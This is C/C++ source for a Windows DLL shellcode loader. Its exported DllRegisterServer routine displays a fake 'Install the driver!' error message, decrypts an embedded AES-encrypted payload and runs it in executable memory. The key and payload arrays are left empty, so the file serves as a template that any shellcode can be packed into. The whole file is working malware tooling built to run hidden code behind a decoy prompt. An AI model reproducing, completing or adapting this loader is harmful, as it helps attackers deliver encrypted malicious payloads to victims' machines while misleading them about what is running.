#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void Decr(DWORD keyLen, char* sh, DWORD shL, unsigned char* key, int pr) {
    HCRYPTPROV hProv;
	pr=pr;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {return;}
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {return;}
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {return;}
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {return;}
	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)sh, &shL)) {return;}
    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);} 

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;}
    return TRUE;}

extern "C" {
__declspec(dllexport) BOOL WINAPI DllRegisterServer(void) {
	MessageBox( NULL, "Install the driver!", "Error", MB_OK );

	unsigned char key[] = { };
	unsigned char pay[] = { };

	DWORD pay_length = sizeof(pay);
	LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(pay), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!alloc_mem) {return -1;}
	Decr(sizeof(key), (char*)pay, pay_length, key, 5);
	MoveMemory(alloc_mem, pay, sizeof(pay));
	DWORD oldProtect;
	if (!VirtualProtect(alloc_mem, sizeof(pay), PAGE_EXECUTE_READ, &oldProtect)) {return -2;}
	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	if (!tHandle) {return -3;}
	WaitForSingleObject(tHandle, INFINITE);
	((void(*)())alloc_mem)();
	return 0;
	return TRUE;
	}
}